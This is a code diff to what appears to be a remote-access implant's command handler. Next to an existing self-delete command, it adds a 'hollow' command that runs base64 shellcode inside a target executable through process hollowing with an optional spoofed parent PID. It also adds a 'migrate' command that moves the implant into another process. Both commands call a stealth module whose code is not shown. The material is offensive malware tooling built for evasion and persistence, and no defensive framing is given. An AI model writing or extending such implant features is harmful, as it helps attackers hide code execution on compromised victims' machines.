@@ -120,3 +120,30 @@ class SelfDeleteCommand(Command):
         from client.modules.stealth import self_delete
         ctx.protocol.send(self_delete())
         return True
+
+
+class HollowCommand(Command):
+    name = 'hollow'
+
+    def execute(self, ctx, raw: str):
+        args = raw[7:].strip().split(None, 2)
+        if len(args) < 2:
+            ctx.protocol.send('[-] Usage: hollow <target_exe> <b64_shellcode> [ppid]')
+            return True
+        from client.modules.stealth import run_in_memory
+        ppid = int(args[2]) if len(args) > 2 else None
+        ctx.protocol.send(run_in_memory(args[1], args[0], ppid))
+        return True
+
+
+class MigrateCommand(Command):
+    name = 'migrate'
+
+    def execute(self, ctx, raw: str):
+        pid = raw[8:].strip()
+        if not pid:
+            ctx.protocol.send('[-] Usage: migrate <pid>')
+            return True
+        from client.modules.stealth import migrate_to_process
+        ctx.protocol.send(migrate_to_process(pid))
+        return True
